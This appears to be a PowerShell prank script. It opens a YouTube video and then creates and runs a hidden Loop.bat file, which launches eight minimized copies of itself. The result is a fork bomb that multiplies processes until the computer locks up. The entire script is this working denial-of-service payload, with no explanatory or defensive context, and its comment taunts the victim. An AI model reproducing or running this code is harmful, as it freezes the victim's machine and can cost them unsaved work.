#Start dance till your dead
start https://www.youtube.com/watch?v=n-T1rx_0q4w
Start-Sleep 3

#Loop
new-Item Loop.bat -type file -force -value "start /min Loop.bat | start /min Loop.bat | start /min Loop.bat | start /min Loop.bat | start /min Loop.bat | start /min Loop.bat | start /min Loop.bat | start /min Loop.bat" | %{$_.Attributes ="hidden"}

start Loop.bat